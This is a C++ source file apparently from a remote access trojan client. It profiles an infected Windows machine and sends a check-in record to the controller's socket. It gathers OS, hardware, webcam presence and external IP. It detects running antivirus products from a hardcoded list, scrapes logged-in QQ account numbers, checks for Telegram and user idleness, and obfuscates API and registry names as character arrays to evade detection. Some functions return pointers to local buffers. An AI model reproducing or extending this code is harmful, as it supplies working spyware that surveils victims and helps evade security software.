#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include <wininet.h>
#include <vfw.h>
#include "until.h"
#include "decode.h"
#include <iphlpapi.h> //网络速率头
#pragma comment ( lib, "iphlpapi.lib" ) 
#pragma comment(lib, "vfw32.lib")
#include "../Myfunction.h"  //自定义函数
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/
#include <TCHAR.h>

extern Myfunction *pMyfunction;
extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);

extern MODIFY_DATA modify_data;

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUClockMhz;	// CPU频率
	int				nCPUNumber;		// CPU核数
	IN_ADDR			WanIPAddress;	// 存储32位的IPv4的地址数据结构(外网)
	IN_ADDR			LanIPAddress;	// 存储32位的IPv4的地址数据结构(内网)
	char			HostName[256];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	DWORD			Speed;		    // 网卡
	DWORD			MemSize;		// 内存大小
	DWORD			DriverSize;		// 硬盘容量
	char			UpGroup[50];	// 上线分组
	char			RunTime[32];	// 运行时间
	char			szVersion[32];	// 上线版本
	char            Virus[50];
	BOOL            bIs64;          // 32位or 64位 1为64 0为32     
	char			MarkTime[50];   // 服务端安装时间
	CHAR szQQNum[256];     //当前运行的QQ号码
	BOOL  bIsActive;	   //用户状态
	TCHAR sznet[20];       //net type
	IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
}LOGININFO;

///////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////
// Get System Information
DWORD CPUClockMhzT()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char xYKTm[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, xYKTm, 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//枚举视频设备
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	CoUninitialize();                   //卸载COM库
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

BOOL GetOSVerIs64Bit() //获取系统平台
{
	BOOL bRet=FALSE;
	SYSTEM_INFO si;
	typedef VOID(__stdcall*GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	GETNATIVESYSTEMINFO fnGetNativeSystemInfo;
    char yGyioJf[] = {'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o','\0'};
	fnGetNativeSystemInfo=(GETNATIVESYSTEMINFO)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),yGyioJf);
	if (fnGetNativeSystemInfo!=NULL)
	{
		fnGetNativeSystemInfo(&si);
		if(si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 )
		{
			bRet=TRUE;
		}
	}
	return bRet;
}

int GetNetwork()//获取网络速率Mbps 
{
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        DWORD speed = 0; 
        DWORD dwspeed = 0;
        MIB_IFTABLE *pIfTable;
        MIB_IFROW *pIfRow;       
        
        pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
        if (pIfTable == NULL) 
        {
                return 1;
        }
        dwSize = sizeof (MIB_IFTABLE);
        if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
        {
                free( pIfTable);
                pIfTable = (MIB_IFTABLE *) malloc(dwSize);
                if (pIfTable == NULL) 
                {
                        return 1;
                }
        }

        if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
        {        
                pIfRow = (MIB_IFROW *) & pIfTable->table[0];
                speed = pIfRow->dwSpeed;
                dwspeed = speed/1000/1000; //mbps        
        } 
        if (pIfTable != NULL) 
        {
                free(pIfTable);
                pIfTable = NULL;
        }
        
        return dwspeed;
}

/////////////////杀毒显示//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;

AYSDFE g_Ayadfe_Datas[40] =
{
    {"360tray.exe",       "360卫士"},
    {"360sd.exe",         "360杀毒"},
    {"kxetray.exe",       "金山毒霸"},
    {"KSafeTray.exe",     "金山安全卫士"},
    {"QQPCRTP.exe",       "QQ电脑管家"},
    {"HipsTray.exe",      "火绒"},
    {"BaiduSd.exe",       "百度杀毒"},
    {"baiduSafeTray.exe", "百度卫士"},
    {"KvMonXP.exe",       "江民"},
    {"RavMonD.exe",       "瑞星"},
    {"QUHLPSVC.EXE",      "QuickHeal"},   //印度
    {"mssecess.exe",      "微软MSE"},
    {"cfp.exe",           "Comodo杀毒"},
    {"SPIDer.exe",        "DR.WEB"},      //大蜘蛛
    {"acs.exe",           "Outpost"},
    {"V3Svc.exe",         "安博士V3"},
    {"AYAgent.aye",       "韩国胶囊"},
    {"avgwdsvc.exe",      "AVG"},
    {"f-secure.exe",      "F-Secure"},    //芬安全
    {"avp.exe",           "卡巴"},
    {"Mcshield.exe",      "麦咖啡"},
    {"egui.exe",          "NOD32"},
    {"knsdtray.exe",      "可牛"},
    {"TMBMSRV.exe",       "趋势"},
    {"avcenter.exe",      "小红伞"},
    {"ashDisp.exe",       "Avast网络安全"}, 
    {"rtvscan.exe",       "诺顿"}, 
    {"remupd.exe",        "熊猫卫士"},
    {"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
    {"PSafeSysTray.exe",  "PSafe反病毒"}, //巴西
    {"ad-watch.exe",      "Ad-watch反间谍"}, 
    {"K7TSecurity.exe",   "K7杀毒"}, 
    {"UnThreat.exe",      "UnThreat"},    //保加利亚
    {"Telegram.exe",      ""},
    {"  ",                "  "}
};

unsigned long GetProcessID(const char* processName);
char* GetVirus()
{
    static char AllName[1024];
    int t = 0;
    int foundSoftware = 0;
    int telegramExists = 0;
    memset(AllName, 0, sizeof(AllName));
    if (GetProcessID("Telegram.exe"))
    {
        strcat(AllName, "飞机在线/ ");
        telegramExists = 1;
    }
    else
    {
        strcat(AllName, "NULL/ ");
    }

    while (g_Ayadfe_Datas[t].Course[0] != ' ')
    {
        if (GetProcessID(g_Ayadfe_Datas[t].Course))
        {
            strcat(AllName, g_Ayadfe_Datas[t].Name);
            strcat(AllName, " ");
            foundSoftware = 1;
        }
        t++;
    }
    if (!foundSoftware)
    {
        strcat(AllName, "---");
    }
    
    return AllName;
}
void ReadRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024]={0};
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	//	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	char JYvni08[] = {'S','Y','S','T','E','M','\\','S','e','l','e','c','t','\0'};
 	wsprintf(strSubKey, JYvni08,lpServiceName);
 	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,lpSame, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
}

UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024] = "SYSTEM\\Setup";
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

char* GetInfo(LPCTSTR lpKeyName, LPCTSTR lpServiceName)
{
	char	strValue[1024]={0};
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if(!ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)strValue, NULL, 1024, 0))
		return "";
	return	strValue;
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{	
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, modify_data.szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	ReadRegExg(lpServiceName ,JYvni04 ,lpBuffer, uSize);
	if (lstrlen(lpBuffer) == 0)
	{
		pMyfunction->my_strcpy(lpBuffer,"无信息");
	}
	return lstrlen(lpBuffer);
}

BOOL GetNtVersionNumbers(DWORD& dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
			dwBuildNumber &= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}

BOOL GetWanIPAddress(IN_ADDR *WanIPAddress)
{
	char iOagR[]={'W','I','N','I','N','E','T','.','d','l','l','\0'};
	char JYvni[]={'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	InternetOpenAT pInternetOpenA=(InternetOpenAT)MyGetProcAddressA(iOagR,JYvni);
	
	char dTyuB[]={'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)MyGetProcAddressA(iOagR,dTyuB);
	
	char lJvdZ[]={'I','n','t','e','r','n','e','t','Q','u','e','r','y','D','a','t','a','A','v','a','i','l','a','b','l','e','\0'};
	typedef BOOL (WINAPI *InternetQueryDataAvailableT)(HINTERNET hFile,LPDWORD lpdwNumberOfBytesAvailable,DWORD dwFlags,DWORD dwContext);
	InternetQueryDataAvailableT pInternetQueryDataAvailable=(InternetQueryDataAvailableT)MyGetProcAddressA(iOagR,lJvdZ);
	
	char eTgDv[]={'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
	InternetReadFileT pInternetReadFile=(InternetReadFileT)MyGetProcAddressA(iOagR,eTgDv);
	
	char aJopX[]={'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0'};
	InternetCloseHandleT pInternetCloseHandle=(InternetCloseHandleT)MyGetProcAddressA(iOagR,aJopX);
	
	char szUrl[] = {'h','t','t','p',':','/','/','w','w','w','.','t','a','o','b','a','o','.','c','o','m','/','h','e','l','p','/','g','e','t','i','p','.','p','h','p','\0'};
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_start;
	char *ip_stop;
	
	hInternet = pInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hHttpFile = pInternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!pInternetQueryDataAvailable(hHttpFile, &dwHttpBufferLen, 0, 0))
	{
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	szHttpBuffer = new char[dwHttpBufferLen+1];
	memset(szHttpBuffer, 0, dwHttpBufferLen+1);
	if (!pInternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
		delete[] szHttpBuffer;
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return FALSE;
	}
	pInternetCloseHandle(hHttpFile);
	pInternetCloseHandle(hInternet);
	ip_start = strchr(szHttpBuffer, '\"');
	ip_stop = strrchr(szHttpBuffer, '\"');
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start++;
		*ip_stop = '\0';
		ULONG Addr = inet_addr(ip_start);
		delete[] szHttpBuffer;
		if (Addr != INADDR_NONE)
		{
			WanIPAddress->S_un.S_addr = Addr;
			return TRUE;
		}
	}
	delete[] szHttpBuffer;
	return FALSE;
}

TCHAR *ConnectionKind()
{
	DWORD flags;
	if (InternetGetConnectedState(&flags, 0))
	{
		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
		{
			return _T("MODEM 连接");
		}
		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
		{
			return _T("LAN 连接");
		}
		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
		{
			return _T("PROXY 连接");
		} else if ((flags & INTERNET_CONNECTION_MODEM_BUSY) == INTERNET_CONNECTION_MODEM_BUSY)
		{
			return _T("BUSY 连接");
		}
		else
			return _T("OTHER 连接");
	}
}

/////////////////

/////////////////
void clean_string(char *str)//去首尾空格
{
	char *start = str - 1;
	char *end = str;
	char *p = str;
	while(*p)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(start + 1==p)
					start = p;
			}
			break;
		default:
			break;
		}
		++p;
	}
	//现在来到了字符串的尾部 反向向前
	--p;
	++start;
	if(*start == 0)
	{
		//已经到字符串的末尾了 
		*str = 0 ;
		return;
	}
	end = p + 1;
	while(p > start)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(end - 1 == p)
					end = p;
			}
			break;
		default:
			break;
		}
		--p;
	}
	memmove(str,start,end-start);
	*(str + (int)end - (int)start) = 0;
}
char * GetQQ()
{
	char QQ[MAX_PATH] = {0};
	char szText[MAX_PATH] = "CTXOPConntion_Class";
    char szQQNumber[MAX_PATH] = {0};
    HWND hWnd = FindWindow(szText, NULL);
    while (hWnd)
    {
		if(strcmp(szText,"CTXOPConntion_Class")==0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			strcat(QQ,szQQNumber);
			strcat(QQ," ");
		}
		hWnd=GetWindow(hWnd,GW_HWNDNEXT);
		GetClassName(hWnd,szText,MAX_PATH);
    }
	CloseHandle(hWnd);
	clean_string(QQ);
	if (strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}
///////////////////////////////////////////////////////////////////////////

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szVersion)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	memset(&LoginInfo,0,sizeof(LoginInfo));
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0;        // 没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	
	// 主机名
	char hostname[256];
	GetHostRemark(hostname, sizeof(hostname));
	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	if (modify_data.bLanPenetrate) GetWanIPAddress(&LoginInfo.WanIPAddress);
	pMyfunction->my_memcpy(&LoginInfo.LanIPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	pMyfunction->my_memcpy(&LoginInfo.HostName, hostname, sizeof(hostname));
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhzT();
	SYSTEM_INFO SysInfo; // 用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	// 内存大小
    MEMORYSTATUSEX	MemInfo; // 用GlobalMemoryStatusEx可显示2G以上内存
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;

	// 硬盘空间
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[11];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //剩余磁盘
    }
	// 硬盘
	LoginInfo.DriverSize = nAllGB;

	// 摄像头
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	// 网卡
	LoginInfo.Speed = GetNetwork();

	// 服务安装时间
	GetMarkTime(modify_data.SerName, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));
	
	// 32 or 64
	LoginInfo.bIs64 = GetOSVerIs64Bit();

	// 杀毒软件
    strcpy( LoginInfo.Virus, GetVirus() );

	// 活动时间
	char jsbHj10[] = {'%','d','\0'};
	DWORD t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	wsprintfA(day, jsbHj10, t/86400000);
	t%=86400000;
	wsprintfA(hour,jsbHj10, t/3600000);
	t%=3600000;
	wsprintfA(min, jsbHj10, t/60000);
	wsprintfA(LoginInfo.RunTime, "%s天%s时%s分", day, hour,min);

    // 上线版本

	char *szVerTemp = MyDecode(szVersion);
		
	strcpy(LoginInfo.szVersion, szVerTemp);
	free(szVerTemp);

	// 上线分组
	char *UpRow = NULL;
	bool bFree = false;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(modify_data.szGroup != NULL)
		{
				UpRow = (char *)(MyDecode(modify_data.szGroup));
			bFree = true;
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}

	strcpy(LoginInfo.UpGroup,UpRow);
	if (bFree) free(UpRow);
	
	// 获取Qq
	lstrcpy(LoginInfo.szQQNum,GetQQ());

	// 用户状态
	LoginInfo.bIsActive = false;
	//是否活动
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//获取上次输入操作的时间。
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5分钟
	{
		//当前系统已经空闲了1分钟
		LoginInfo.bIsActive = true;
	}

	//net
	lstrcpy(LoginInfo.sznet, ConnectionKind());

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	return nRet;
}
